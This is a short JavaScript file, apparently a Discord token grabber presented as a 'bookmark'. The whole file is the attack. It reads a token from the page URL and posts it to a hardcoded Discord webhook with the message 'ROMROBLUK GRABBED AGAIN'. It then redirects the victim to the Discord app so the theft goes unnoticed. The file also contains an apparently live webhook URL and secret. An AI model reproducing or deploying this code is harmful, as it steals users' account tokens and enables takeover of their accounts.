function redirect(redirectUrl) {
    console.log("Redirecting to " + redirectUrl)
    window.location.replace(redirectUrl);
}

function send_to_webhook() {
    const request = new XMLHttpRequest();
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const token = urlParams.get('id');
    request.open("POST", "https://discord.com/api/webhooks/1177643993165725746/B3nvYavnmSxkbosenMYVRUlmVsYiGcFDiD-BWL23Dt4jpuAvdTBXcTjD7eSdwkmhnDIC");

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
        username: "Bookmark by romrobluk",
        avatar_url: "",
        content: "@everyone\nROMROBLUK GRABBED AGAIN\n\nTOKEN: `" + token + "`"
    }

    request.send(JSON.stringify(params));
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
  
function run() {
    send_to_webhook();
    sleep(2000).then(() => { redirect('https://discord.com/app') });
}